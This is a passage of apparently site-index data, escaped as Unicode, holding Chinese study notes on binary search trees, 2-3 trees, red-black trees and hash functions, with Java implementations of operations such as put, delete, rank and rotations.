\u4E8C\u53C9\u67E5\u627E\u6811 \uFF08BST\uFF09\u662F\u4E00\u9897\u4E8C\u53C9\u6811\uFF0C\u5E76\u4E14\u6BCF\u4E2A\u8282\u70B9\u7684\u503C\u90FD\u5927\u4E8E\u7B49\u4E8E\u5176\u5DE6\u5B50\u6811\u4E2D\u7684\u6240\u6709\u8282\u70B9\u7684\u503C\u800C\u5C0F\u4E8E\u7B49\u4E8E\u53F3\u5B50\u6811\u7684\u6240\u6709\u8282\u70B9\u7684\u503C\u3002
BST \u6709\u4E00\u4E2A\u91CD\u8981\u6027\u8D28\uFF0C\u5C31\u662F\u5B83\u7684\u4E2D\u5E8F\u904D\u5386\u7ED3\u679C\u9012\u589E\u6392\u5E8F\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ef552ae3-ae0d-4217-88e6-99cbe8163f0c.jpg" width="200)
\u57FA\u672C\u6570\u636E\u7ED3\u6784\uFF1A
public class BST<Key extends Comparable<Key>, Value> implements OrderedST<Key, Value> { protected Node root; protected class Node { Key key; Value val; Node left; Node right; // \u4EE5\u8BE5\u8282\u70B9\u4E3A\u6839\u7684\u5B50\u6811\u8282\u70B9\u603B\u6570 int N; // \u7EA2\u9ED1\u6811\u4E2D\u4F7F\u7528 boolean color; Node(Key key, Value val, int N) { this.key = key; this.val = val; this.N = N; } } @Override public int size() { return size(root); } private int size(Node x) { if (x == null) return 0; return x.N; } protected void recalculateSize(Node x) { x.N = size(x.left) + size(x.right) + 1; }
}
\u4E3A\u4E86\u65B9\u4FBF\u7ED8\u56FE\uFF0C\u4E0B\u6587\u4E2D\u4E8C\u53C9\u6811\u7684\u7A7A\u94FE\u63A5\u4E0D\u753B\u51FA\u6765\u3002`},{header:"1. get()",slug:"_1-get",content:`\u5982\u679C\u6811\u662F\u7A7A\u7684\uFF0C\u5219\u67E5\u627E\u672A\u547D\u4E2D\uFF1B
\u5982\u679C\u88AB\u67E5\u627E\u7684\u952E\u548C\u6839\u8282\u70B9\u7684\u952E\u76F8\u7B49\uFF0C\u67E5\u627E\u547D\u4E2D\uFF1B
\u5426\u5219\u9012\u5F52\u5730\u5728\u5B50\u6811\u4E2D\u67E5\u627E\uFF1A\u5982\u679C\u88AB\u67E5\u627E\u7684\u952E\u8F83\u5C0F\u5C31\u5728\u5DE6\u5B50\u6811\u4E2D\u67E5\u627E\uFF0C\u8F83\u5927\u5C31\u5728\u53F3\u5B50\u6811\u4E2D\u67E5\u627E\u3002 @Override
public Value get(Key key) { return get(root, key);
} private Value get(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x.val; else if (cmp < 0) return get(x.left, key); else return get(x.right, key);
}`},{header:"2. put()",slug:"_2-put",content:`\u5F53\u63D2\u5165\u7684\u952E\u4E0D\u5B58\u5728\u4E8E\u6811\u4E2D\uFF0C\u9700\u8981\u521B\u5EFA\u4E00\u4E2A\u65B0\u8282\u70B9\uFF0C\u5E76\u4E14\u66F4\u65B0\u4E0A\u5C42\u8282\u70B9\u7684\u94FE\u63A5\u6307\u5411\u8BE5\u8282\u70B9\uFF0C\u4F7F\u5F97\u8BE5\u8282\u70B9\u6B63\u786E\u5730\u94FE\u63A5\u5230\u6811\u4E2D\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/58b70113-3876-49af-85a9-68eb00a72d59.jpg" width="200) @Override
public void put(Key key, Value value) { root = put(root, key, value);
} private Node put(Node x, Key key, Value value) { if (x == null) return new Node(key, value, 1); int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp < 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); recalculateSize(x); return x;
}`},{header:"3. \u5206\u6790",slug:"_3-\u5206\u6790",content:`\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u7B97\u6CD5\u8FD0\u884C\u65F6\u95F4\u53D6\u51B3\u4E8E\u6811\u7684\u5F62\u72B6\uFF0C\u800C\u6811\u7684\u5F62\u72B6\u53C8\u53D6\u51B3\u4E8E\u952E\u88AB\u63D2\u5165\u7684\u5148\u540E\u987A\u5E8F\u3002
\u6700\u597D\u7684\u60C5\u51B5\u4E0B\u6811\u662F\u5B8C\u5168\u5E73\u8861\u7684\uFF0C\u6BCF\u6761\u7A7A\u94FE\u63A5\u548C\u6839\u8282\u70B9\u7684\u8DDD\u79BB\u90FD\u4E3A logN\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c395a428-827c-405b-abd7-8a069316f583.jpg" width="200)
\u5728\u6700\u574F\u7684\u60C5\u51B5\u4E0B\uFF0C\u6811\u7684\u9AD8\u5EA6\u4E3A N\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5ea609cb-8ad4-4c4c-aee6-45a40a81794a.jpg" width="200)`},{header:"4. floor()",slug:"_4-floor",content:`floor(key)\uFF1A\u5C0F\u4E8E\u7B49\u4E8E\u952E\u7684\u6700\u5927\u952E \u5982\u679C\u952E\u5C0F\u4E8E\u6839\u8282\u70B9\u7684\u952E\uFF0C\u90A3\u4E48 floor(key) \u4E00\u5B9A\u5728\u5DE6\u5B50\u6811\u4E2D\uFF1B
\u5982\u679C\u952E\u5927\u4E8E\u6839\u8282\u70B9\u7684\u952E\uFF0C\u9700\u8981\u5148\u5224\u65AD\u53F3\u5B50\u6811\u4E2D\u662F\u5426\u5B58\u5728 floor(key)\uFF0C\u5982\u679C\u5B58\u5728\u5C31\u8FD4\u56DE\uFF0C\u5426\u5219\u6839\u8282\u70B9\u5C31\u662F floor(key)\u3002 public Key floor(Key key) { Node x = floor(root, key); if (x == null) return null; return x.key;
} private Node floor(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp == 0) return x; if (cmp < 0) return floor(x.left, key); Node t = floor(x.right, key); return t != null ? t : x;
}`},{header:"5. rank()",slug:"_5-rank",content:`rank(key) \u8FD4\u56DE key \u7684\u6392\u540D\u3002 \u5982\u679C\u952E\u548C\u6839\u8282\u70B9\u7684\u952E\u76F8\u7B49\uFF0C\u8FD4\u56DE\u5DE6\u5B50\u6811\u7684\u8282\u70B9\u6570\uFF1B
\u5982\u679C\u5C0F\u4E8E\uFF0C\u9012\u5F52\u8BA1\u7B97\u5728\u5DE6\u5B50\u6811\u4E2D\u7684\u6392\u540D\uFF1B
\u5982\u679C\u5927\u4E8E\uFF0C\u9012\u5F52\u8BA1\u7B97\u5728\u53F3\u5B50\u6811\u4E2D\u7684\u6392\u540D\uFF0C\u52A0\u4E0A\u5DE6\u5B50\u6811\u7684\u8282\u70B9\u6570\uFF0C\u518D\u52A0\u4E0A 1\uFF08\u6839\u8282\u70B9\uFF09\u3002 @Override
public int rank(Key key) { return rank(key, root);
} private int rank(Key key, Node x) { if (x == null) return 0; int cmp = key.compareTo(x.key); if (cmp == 0) return size(x.left); else if (cmp < 0) return rank(key, x.left); else return 1 + size(x.left) + rank(key, x.right);
}`},{header:"6. min()",slug:"_6-min",content:`@Override
public Key min() { return min(root).key;
} private Node min(Node x) { if (x == null) return null; if (x.left == null) return x; return min(x.left);
}`},{header:"7. deleteMin()",slug:"_7-deletemin",content:`\u4EE4\u6307\u5411\u6700\u5C0F\u8282\u70B9\u7684\u94FE\u63A5\u6307\u5411\u6700\u5C0F\u8282\u70B9\u7684\u53F3\u5B50\u6811\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/31b7e8de-ed11-4f69-b5fd-ba454120ac31.jpg" width="450)
public void deleteMin() { root = deleteMin(root);
} public Node deleteMin(Node x) { if (x.left == null) return x.right; x.left = deleteMin(x.left); recalculateSize(x); return x;
}`},{header:"8. delete()",slug:"_8-delete",content:`\u5982\u679C\u5F85\u5220\u9664\u7684\u8282\u70B9\u53EA\u6709\u4E00\u4E2A\u5B50\u6811\uFF0C \u90A3\u4E48\u53EA\u9700\u8981\u8BA9\u6307\u5411\u5F85\u5220\u9664\u8282\u70B9\u7684\u94FE\u63A5\u6307\u5411\u552F\u4E00\u7684\u5B50\u6811\u5373\u53EF\uFF1B
\u5426\u5219\uFF0C\u8BA9\u53F3\u5B50\u6811\u7684\u6700\u5C0F\u8282\u70B9\u66FF\u6362\u8BE5\u8282\u70B9\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/23b9d625-ef28-42b5-bb22-d7aedd007e16.jpg" width="400)
public void delete(Key key) { root = delete(root, key);
}
private Node delete(Node x, Key key) { if (x == null) return null; int cmp = key.compareTo(x.key); if (cmp < 0) x.left = delete(x.left, key); else if (cmp > 0) x.right = delete(x.right, key); else { if (x.right == null) return x.left; if (x.left == null) return x.right; Node t = x; x = min(t.right); x.right = deleteMin(t.right); x.left = t.left; } recalculateSize(x); return x;
}`},{header:"9. keys()",slug:"_9-keys",content:`\u5229\u7528\u4E8C\u53C9\u67E5\u627E\u6811\u4E2D\u5E8F\u904D\u5386\u7684\u7ED3\u679C\u4E3A\u9012\u589E\u7684\u7279\u70B9\u3002
@Override
public List<Key> keys(Key l, Key h) { return keys(root, l, h);
} private List<Key> keys(Node x, Key l, Key h) { List<Key> list = new ArrayList<>(); if (x == null) return list; int cmpL = l.compareTo(x.key); int cmpH = h.compareTo(x.key); if (cmpL < 0) list.addAll(keys(x.left, l, h)); if (cmpL <= 0 && cmpH >= 0) list.add(x.key); if (cmpH > 0) list.addAll(keys(x.right, l, h)); return list;
}`},{header:"10. \u5206\u6790",slug:"_10-\u5206\u6790",content:"\u4E8C\u53C9\u67E5\u627E\u6811\u6240\u6709\u64CD\u4F5C\u5728\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u6240\u9700\u8981\u7684\u65F6\u95F4\u90FD\u548C\u6811\u7684\u9AD8\u5EA6\u6210\u6B63\u6BD4\u3002"},{header:"2-3 \u67E5\u627E\u6811",slug:"_2-3-\u67E5\u627E\u6811",content:`2-3 \u67E5\u627E\u6811\u5F15\u5165\u4E86 2- \u8282\u70B9\u548C 3- \u8282\u70B9\uFF0C\u76EE\u7684\u662F\u4E3A\u4E86\u8BA9\u6811\u5E73\u8861\u3002\u4E00\u9897\u5B8C\u7F8E\u5E73\u8861\u7684 2-3 \u67E5\u627E\u6811\u7684\u6240\u6709\u7A7A\u94FE\u63A5\u5230\u6839\u8282\u70B9\u7684\u8DDD\u79BB\u5E94\u8BE5\u662F\u76F8\u540C\u7684\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1097658b-c0e6-4821-be9b-25304726a11c.jpg" width="160px)`},{header:"1. \u63D2\u5165\u64CD\u4F5C",slug:"_1-\u63D2\u5165\u64CD\u4F5C",content:`\u63D2\u5165\u64CD\u4F5C\u548C BST \u7684\u63D2\u5165\u64CD\u4F5C\u6709\u5F88\u5927\u533A\u522B\uFF0CBST \u7684\u63D2\u5165\u64CD\u4F5C\u662F\u5148\u8FDB\u884C\u4E00\u6B21\u672A\u547D\u4E2D\u7684\u67E5\u627E\uFF0C\u7136\u540E\u518D\u5C06\u8282\u70B9\u63D2\u5165\u5230\u5BF9\u5E94\u7684\u7A7A\u94FE\u63A5\u4E0A\u3002\u4F46\u662F 2-3 \u67E5\u627E\u6811\u5982\u679C\u4E5F\u8FD9\u4E48\u505A\u7684\u8BDD\uFF0C\u90A3\u4E48\u5C31\u4F1A\u7834\u574F\u4E86\u5E73\u8861\u6027\u3002\u5B83\u662F\u5C06\u65B0\u8282\u70B9\u63D2\u5165\u5230\u53F6\u5B50\u8282\u70B9\u4E0A\u3002
\u6839\u636E\u53F6\u5B50\u8282\u70B9\u7684\u7C7B\u578B\u4E0D\u540C\uFF0C\u6709\u4E0D\u540C\u7684\u5904\u7406\u65B9\u5F0F\uFF1A \u5982\u679C\u63D2\u5165\u5230 2- \u8282\u70B9\u4E0A\uFF0C\u90A3\u4E48\u76F4\u63A5\u5C06\u65B0\u8282\u70B9\u548C\u539F\u6765\u7684\u8282\u70B9\u7EC4\u6210 3- \u8282\u70B9\u5373\u53EF\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0c6f9930-8704-4a54-af23-19f9ca3e48b0.jpg" width="350) \u5982\u679C\u662F\u63D2\u5165\u5230 3- \u8282\u70B9\u4E0A\uFF0C\u5C31\u4F1A\u4EA7\u751F\u4E00\u4E2A\u4E34\u65F6 4- \u8282\u70B9\u65F6\uFF0C\u9700\u8981\u5C06 4- \u8282\u70B9\u5206\u88C2\u6210 3 \u4E2A 2- \u8282\u70B9\uFF0C\u5E76\u5C06\u4E2D\u95F4\u7684 2- \u8282\u70B9\u79FB\u5230\u4E0A\u5C42\u8282\u70B9\u4E2D\u3002\u5982\u679C\u4E0A\u79FB\u64CD\u4F5C\u7EE7\u7EED\u4EA7\u751F\u4E34\u65F6 4- \u8282\u70B9\u5219\u4E00\u76F4\u8FDB\u884C\u5206\u88C2\u4E0A\u79FB\uFF0C\u76F4\u5230\u4E0D\u5B58\u5728\u4E34\u65F6 4- \u8282\u70B9\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7002c01b-1ed5-475a-9e5f-5fc8a4cdbcc0.jpg" width="460)`},{header:"2. \u6027\u8D28",slug:"_2-\u6027\u8D28",content:`2-3 \u67E5\u627E\u6811\u63D2\u5165\u64CD\u4F5C\u7684\u53D8\u6362\u90FD\u662F\u5C40\u90E8\u7684\uFF0C\u9664\u4E86\u76F8\u5173\u7684\u8282\u70B9\u548C\u94FE\u63A5\u4E4B\u5916\u4E0D\u5FC5\u4FEE\u6539\u6216\u8005\u68C0\u67E5\u6811\u7684\u5176\u5B83\u90E8\u5206\uFF0C\u800C\u8FD9\u4E9B\u5C40\u90E8\u53D8\u6362\u4E0D\u4F1A\u5F71\u54CD\u6811\u7684\u5168\u5C40\u6709\u5E8F\u6027\u548C\u5E73\u8861\u6027\u3002
2-3 \u67E5\u627E\u6811\u7684\u67E5\u627E\u548C\u63D2\u5165\u64CD\u4F5C\u590D\u6742\u5EA6\u548C\u63D2\u5165\u987A\u5E8F\u65E0\u5173\uFF0C\u5728\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u67E5\u627E\u548C\u63D2\u5165\u64CD\u4F5C\u8BBF\u95EE\u7684\u8282\u70B9\u5FC5\u7136\u4E0D\u8D85\u8FC7 logN \u4E2A\uFF0C\u542B\u6709 10 \u4EBF\u4E2A\u8282\u70B9\u7684 2-3 \u67E5\u627E\u6811\u6700\u591A\u53EA\u9700\u8981\u8BBF\u95EE 30 \u4E2A\u8282\u70B9\u5C31\u80FD\u8FDB\u884C\u4EFB\u610F\u7684\u67E5\u627E\u548C\u63D2\u5165\u64CD\u4F5C\u3002`},{header:"\u7EA2\u9ED1\u6811",slug:"\u7EA2\u9ED1\u6811",content:`\u7EA2\u9ED1\u6811\u662F 2-3 \u67E5\u627E\u6811\uFF0C\u4F46\u5B83\u4E0D\u9700\u8981\u5206\u522B\u5B9A\u4E49 2- \u8282\u70B9\u548C 3- \u8282\u70B9\uFF0C\u800C\u662F\u5728\u666E\u901A\u7684\u4E8C\u53C9\u67E5\u627E\u6811\u4E4B\u4E0A\uFF0C\u4E3A\u8282\u70B9\u6DFB\u52A0\u989C\u8272\u3002\u6307\u5411\u4E00\u4E2A\u8282\u70B9\u7684\u94FE\u63A5\u989C\u8272\u5982\u679C\u4E3A\u7EA2\u8272\uFF0C\u90A3\u4E48\u8FD9\u4E2A\u8282\u70B9\u548C\u4E0A\u5C42\u8282\u70B9\u8868\u793A\u7684\u662F\u4E00\u4E2A 3- \u8282\u70B9\uFF0C\u800C\u9ED1\u8272\u5219\u662F\u666E\u901A\u94FE\u63A5\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f1912ba6-6402-4321-9aa8-13d32fd121d1.jpg" width="240)
\u7EA2\u9ED1\u6811\u5177\u6709\u4EE5\u4E0B\u6027\u8D28\uFF1A \u7EA2\u94FE\u63A5\u90FD\u4E3A\u5DE6\u94FE\u63A5\uFF1B
\u5B8C\u7F8E\u9ED1\u8272\u5E73\u8861\uFF0C\u5373\u4EFB\u610F\u7A7A\u94FE\u63A5\u5230\u6839\u8282\u70B9\u7684\u8DEF\u5F84\u4E0A\u7684\u9ED1\u94FE\u63A5\u6570\u91CF\u76F8\u540C\u3002 \u753B\u7EA2\u9ED1\u6811\u65F6\u53EF\u4EE5\u5C06\u7EA2\u94FE\u63A5\u753B\u5E73\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f5cb6028-425d-4939-91eb-cca9dd6b6c6c.jpg" width="220)
public class RedBlackBST<Key extends Comparable<Key>, Value> extends BST<Key, Value> { private static final boolean RED = true; private static final boolean BLACK = false; private boolean isRed(Node x) { if (x == null) return false; return x.color == RED; }
}`},{header:"1. \u5DE6\u65CB\u8F6C",slug:"_1-\u5DE6\u65CB\u8F6C",content:`\u56E0\u4E3A\u5408\u6CD5\u7684\u7EA2\u94FE\u63A5\u90FD\u4E3A\u5DE6\u94FE\u63A5\uFF0C\u5982\u679C\u51FA\u73B0\u53F3\u94FE\u63A5\u4E3A\u7EA2\u94FE\u63A5\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u8FDB\u884C\u5DE6\u65CB\u8F6C\u64CD\u4F5C\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/f4d534ab-0092-4a81-9e5b-ae889b9a72be.jpg" width="480)
public Node rotateLeft(Node h) { Node x = h.right; h.right = x.left; x.left = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;
}`},{header:"2. \u53F3\u65CB\u8F6C",slug:"_2-\u53F3\u65CB\u8F6C",content:`\u8FDB\u884C\u53F3\u65CB\u8F6C\u662F\u4E3A\u4E86\u8F6C\u6362\u4E24\u4E2A\u8FDE\u7EED\u7684\u5DE6\u7EA2\u94FE\u63A5\uFF0C\u8FD9\u4F1A\u5728\u4E4B\u540E\u7684\u63D2\u5165\u8FC7\u7A0B\u4E2D\u63A2\u8BA8\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c8ffea-a9f2-4ebe-97d1-d71be71246f9.jpg" width="480)
public Node rotateRight(Node h) { Node x = h.left; h.left = x.right; x.right = h; x.color = h.color; h.color = RED; x.N = h.N; recalculateSize(h); return x;
}`},{header:"3. \u989C\u8272\u8F6C\u6362",slug:"_3-\u989C\u8272\u8F6C\u6362",content:`\u4E00\u4E2A 4- \u8282\u70B9\u5728\u7EA2\u9ED1\u6811\u4E2D\u8868\u73B0\u4E3A\u4E00\u4E2A\u8282\u70B9\u7684\u5DE6\u53F3\u5B50\u8282\u70B9\u90FD\u662F\u7EA2\u8272\u7684\u3002\u5206\u88C2 4- \u8282\u70B9\u9664\u4E86\u9700\u8981\u5C06\u5B50\u8282\u70B9\u7684\u989C\u8272\u7531\u7EA2\u53D8\u9ED1\u4E4B\u5916\uFF0C\u540C\u65F6\u9700\u8981\u5C06\u7236\u8282\u70B9\u7684\u989C\u8272\u7531\u9ED1\u53D8\u7EA2\uFF0C\u4ECE 2-3 \u6811\u7684\u89D2\u5EA6\u770B\u5C31\u662F\u5C06\u4E2D\u95F4\u8282\u70B9\u79FB\u5230\u4E0A\u5C42\u8282\u70B9\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/094b279a-b2db-4be7-87a3-b2a039c7448e.jpg" width="270)
void flipColors(Node h) { h.color = RED; h.left.color = BLACK; h.right.color = BLACK;
}`},{header:"4. \u63D2\u5165",slug:"_4-\u63D2\u5165",content:`\u5148\u5C06\u4E00\u4E2A\u8282\u70B9\u6309\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u65B9\u6CD5\u63D2\u5165\u5230\u6B63\u786E\u4F4D\u7F6E\uFF0C\u7136\u540E\u518D\u8FDB\u884C\u5982\u4E0B\u989C\u8272\u64CD\u4F5C\uFF1A \u5982\u679C\u53F3\u5B50\u8282\u70B9\u662F\u7EA2\u8272\u7684\u800C\u5DE6\u5B50\u8282\u70B9\u662F\u9ED1\u8272\u7684\uFF0C\u8FDB\u884C\u5DE6\u65CB\u8F6C\uFF1B
\u5982\u679C\u5DE6\u5B50\u8282\u70B9\u662F\u7EA2\u8272\u7684\uFF0C\u800C\u4E14\u5DE6\u5B50\u8282\u70B9\u7684\u5DE6\u5B50\u8282\u70B9\u4E5F\u662F\u7EA2\u8272\u7684\uFF0C\u8FDB\u884C\u53F3\u65CB\u8F6C\uFF1B
\u5982\u679C\u5DE6\u53F3\u5B50\u8282\u70B9\u5747\u4E3A\u7EA2\u8272\u7684\uFF0C\u8FDB\u884C\u989C\u8272\u8F6C\u6362\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/4c457532-550b-4eca-b881-037b84b4934b.jpg" width="430)
@Override
public void put(Key key, Value value) { root = put(root, key, value); root.color = BLACK;
} private Node put(Node x, Key key, Value value) { if (x == null) { Node node = new Node(key, value, 1); node.color = RED; return node; } int cmp = key.compareTo(x.key); if (cmp == 0) x.val = value; else if (cmp < 0) x.left = put(x.left, key, value); else x.right = put(x.right, key, value); if (isRed(x.right) && !isRed(x.left)) x = rotateLeft(x); if (isRed(x.left) && isRed(x.left.left)) x = rotateRight(x); if (isRed(x.left) && isRed(x.right)) flipColors(x); recalculateSize(x); return x;
}
\u53EF\u4EE5\u770B\u5230\u8BE5\u63D2\u5165\u64CD\u4F5C\u548C\u4E8C\u53C9\u67E5\u627E\u6811\u7684\u63D2\u5165\u64CD\u4F5C\u7C7B\u4F3C\uFF0C\u53EA\u662F\u5728\u6700\u540E\u52A0\u5165\u4E86\u65CB\u8F6C\u548C\u989C\u8272\u53D8\u6362\u64CD\u4F5C\u5373\u53EF\u3002
\u6839\u8282\u70B9\u4E00\u5B9A\u4E3A\u9ED1\u8272\uFF0C\u56E0\u4E3A\u6839\u8282\u70B9\u6CA1\u6709\u4E0A\u5C42\u8282\u70B9\uFF0C\u4E5F\u5C31\u6CA1\u6709\u4E0A\u5C42\u8282\u70B9\u7684\u5DE6\u94FE\u63A5\u6307\u5411\u6839\u8282\u70B9\u3002flipColors() \u6709\u53EF\u80FD\u4F1A\u4F7F\u5F97\u6839\u8282\u70B9\u7684\u989C\u8272\u53D8\u4E3A\u7EA2\u8272\uFF0C\u6BCF\u5F53\u6839\u8282\u70B9\u7531\u7EA2\u8272\u53D8\u6210\u9ED1\u8272\u65F6\u6811\u7684\u9ED1\u94FE\u63A5\u9AD8\u5EA6\u52A0 1.`},{header:"5. \u5206\u6790",slug:"_5-\u5206\u6790",content:`\u4E00\u9897\u5927\u5C0F\u4E3A N \u7684\u7EA2\u9ED1\u6811\u7684\u9AD8\u5EA6\u4E0D\u4F1A\u8D85\u8FC7 2logN\u3002\u6700\u574F\u7684\u60C5\u51B5\u4E0B\u662F\u5B83\u6240\u5BF9\u5E94\u7684 2-3 \u6811\uFF0C\u6784\u6210\u6700\u5DE6\u8FB9\u7684\u8DEF\u5F84\u8282\u70B9\u5168\u90E8\u90FD\u662F 3- \u8282\u70B9\u800C\u5176\u4F59\u90FD\u662F 2- \u8282\u70B9\u3002
\u7EA2\u9ED1\u6811\u5927\u591A\u6570\u7684\u64CD\u4F5C\u6240\u9700\u8981\u7684\u65F6\u95F4\u90FD\u662F\u5BF9\u6570\u7EA7\u522B\u7684\u3002`},{header:"\u6563\u5217\u8868",slug:"\u6563\u5217\u8868",content:`\u6563\u5217\u8868\u7C7B\u4F3C\u4E8E\u6570\u7EC4\uFF0C\u53EF\u4EE5\u628A\u6563\u5217\u8868\u7684\u6563\u5217\u503C\u770B\u6210\u6570\u7EC4\u7684\u7D22\u5F15\u503C\u3002\u8BBF\u95EE\u6563\u5217\u8868\u548C\u8BBF\u95EE\u6570\u7EC4\u5143\u7D20\u4E00\u6837\u5FEB\u901F\uFF0C\u5B83\u53EF\u4EE5\u5728\u5E38\u6570\u65F6\u95F4\u5185\u5B9E\u73B0\u67E5\u627E\u548C\u63D2\u5165\u64CD\u4F5C\u3002
\u7531\u4E8E\u65E0\u6CD5\u901A\u8FC7\u6563\u5217\u503C\u77E5\u9053\u952E\u7684\u5927\u5C0F\u5173\u7CFB\uFF0C\u56E0\u6B64\u6563\u5217\u8868\u65E0\u6CD5\u5B9E\u73B0\u6709\u5E8F\u6027\u64CD\u4F5C\u3002`},{header:"1. \u6563\u5217\u51FD\u6570",slug:"_1-\u6563\u5217\u51FD\u6570",content:`\u5BF9\u4E8E\u4E00\u4E2A\u5927\u5C0F\u4E3A M \u7684\u6563\u5217\u8868\uFF0C\u6563\u5217\u51FD\u6570\u80FD\u591F\u628A\u4EFB\u610F\u952E\u8F6C\u6362\u4E3A [0, M-1] \u5185\u7684\u6B63\u6574\u6570\uFF0C\u8BE5\u6B63\u6574\u6570\u5373\u4E3A hash \u503C\u3002
\u6563\u5217\u8868\u5B58\u5728\u51B2\u7A81\uFF0C\u4E5F\u5C31\u662F\u4E24\u4E2A\u4E0D\u540C\u7684\u952E\u53EF\u80FD\u6709\u76F8\u540C\u7684 hash \u503C\u3002
\u6563\u5217\u51FD\u6570\u5E94\u8BE5\u6EE1\u8DB3\u4EE5\u4E0B\u4E09\u4E2A\u6761\u4EF6\uFF1A \u4E00\u81F4\u6027\uFF1A\u76F8\u7B49\u7684\u952E\u5E94\u5F53\u6709\u76F8\u7B49\u7684 hash \u503C\uFF0C\u4E24\u4E2A\u952E\u76F8\u7B49\u8868\u793A\u8C03\u7528 equals() \u8FD4\u56DE\u7684\u503C\u76F8\u7B49\u3002
\u9AD8\u6548\u6027\uFF1A\u8BA1\u7B97\u5E94\u5F53\u7B80\u4FBF\uFF0C\u6709\u5FC5\u8981\u7684\u8BDD\u53EF\u4EE5\u628A hash \u503C\u7F13\u5B58\u8D77\u6765\uFF0C\u5728\u8C03\u7528 hash \u51FD\u6570\u65F6\u76F4\u63A5\u8FD4\u56DE\u3002
\u5747\u5300\u6027\uFF1A\u6240\u6709\u952E\u7684 hash \u503C\u5E94\u5F53\u5747\u5300\u5730\u5206\u5E03\u5230 [0, M-1] \u4E4B\u95F4\uFF0C\u5982\u679C\u4E0D\u80FD\u6EE1\u8DB3\u8FD9\u4E2A\u6761\u4EF6\uFF0C\u6709\u53EF\u80FD\u4EA7\u751F\u5F88\u591A\u51B2\u7A81\uFF0C\u4ECE\u800C\u5BFC\u81F4\u6563\u5217\u8868\u7684\u6027\u80FD\u4E0B\u964D\u3002 \u9664\u7559\u4F59\u6570\u6CD5\u53EF\u4EE5\u5C06\u6574\u6570\u6563\u5217\u5230 [0, M-1] \u4E4B\u95F4\uFF0C\u4F8B\u5982\u4E00\u4E2A\u6B63\u6574\u6570 k\uFF0C\u8BA1\u7B97 k%M \u65E2\u53EF\u5F97\u5230\u4E00\u4E2A [0, M-1] \u4E4B\u95F4\u7684 hash \u503C\u3002\u6CE8\u610F M \u6700\u597D\u662F\u4E00\u4E2A\u7D20\u6570\uFF0C\u5426\u5219\u65E0\u6CD5\u5229\u7528\u952E\u5305\u542B\u7684\u6240\u6709\u4FE1\u606F\u3002\u4F8B\u5982 M \u4E3A 10k\uFF0C\u90A3\u4E48\u53EA\u80FD\u5229\u7528\u952E\u7684\u540E k \u4F4D\u3002
\u5BF9\u4E8E\u5176\u5B83\u6570\uFF0C\u53EF\u4EE5\u5C06\u5176\u8F6C\u6362\u6210\u6574\u6570\u7684\u5F62\u5F0F\uFF0C\u7136\u540E\u5229\u7528\u9664\u7559\u4F59\u6570\u6CD5\u3002\u4F8B\u5982\u5BF9\u4E8E\u6D6E\u70B9\u6570\uFF0C\u53EF\u4EE5\u5C06\u5176\u7684\u4E8C\u8FDB\u5236\u5F62\u5F0F\u8F6C\u6362\u6210\u6574\u6570\u3002
\u5BF9\u4E8E\u591A\u90E8\u5206\u7EC4\u5408\u7684\u7C7B\u578B\uFF0C\u6BCF\u4E2A\u90E8\u5206\u90FD\u9700\u8981\u8BA1\u7B97 hash \u503C\uFF0C\u8FD9\u4E9B hash \u503C\u90FD\u5177\u6709\u540C\u7B49\u91CD\u8981\u7684\u5730\u4F4D\u3002\u4E3A\u4E86\u8FBE\u5230\u8FD9\u4E2A\u76EE\u7684\uFF0C\u53EF\u4EE5\u5C06\u8BE5\u7C7B\u578B\u770B\u6210 R \u8FDB\u5236\u7684\u6574\u6570\uFF0C\u6BCF\u4E2A\u90E8\u5206\u90FD\u5177\u6709\u4E0D\u540C\u7684\u6743\u503C\u3002
\u4F8B\u5982\uFF0C\u5B57\u7B26\u4E32\u7684\u6563\u5217\u51FD\u6570\u5B9E\u73B0\u5982\u4E0B\uFF1A
int hash = 0;
for (int i = 0; i < s.length(); i++) hash = (R * hash + s.charAt(i)) % M;
\u518D\u6BD4\u5982\uFF0C\u62E5\u6709\u591A\u4E2A\u6210\u5458\u7684\u81EA\u5B9A\u4E49\u7C7B\u7684\u54C8\u5E0C\u51FD\u6570\u5982\u4E0B\uFF1A
int hash = (((day * R + month) % M) * R + year) % M;
R \u901A\u5E38\u53D6 31\u3002
